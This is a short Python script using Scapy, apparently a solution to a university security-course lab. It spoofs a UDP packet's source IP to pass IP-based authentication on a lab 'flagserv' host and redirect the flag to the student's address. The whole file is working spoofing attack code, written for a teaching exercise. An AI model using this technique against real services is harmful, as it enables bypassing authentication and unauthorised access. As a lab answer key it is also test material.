############################
# UDP Spoofing
# 04-01-2023
############################

from scapy.all import *

########################################################################################
# Define constants for the source and destination IP addresses and the target IP address
########################################################################################
# Source IP is the spoofed IP to pass IP auth on flagserv
SRC_IP = "10.2.4.10"
# Destination IP is the IP address of flagserv.cse543.rev.fish on the private ASU VPN network
DST_IP = "172.16.44.1"
# Target is the IP addressed issued by remote vpn.cse543.rev.fish 3000
TARGET_IP = "172.16.44.18"

#########################################################
# Construct the UDP packet with the constant IP addresses
#########################################################
# packet = IP(src="10.2.4.10", dst="172.16.44.1")/UDP(sport=13337, dport=13337)/"172.16.44.18"
# NOTE: The TARGET_IP address is sent in packet to instruct FlagServ to send flag to it
packet = IP(src=SRC_IP, dst=DST_IP) / UDP(sport=13337, dport=13337) / TARGET_IP

# Sends packet and receives packet(s) with a 3000ms timeout
unans, ans = sr(packet, timeout=3)

##############################################################################
# Iterate through the ans and uns list returned from sr() and prints to screen
##############################################################################
for response in ans:
    print("Received response from:", response[1].summary())
    print("Response packet:", response[1].show(True))
    print("Response payload:", response[1].payload)

# Iterate through the unans list and print the information to the screen
for unanswered in unans:
    print("No response received from:", unanswered[1].summary())
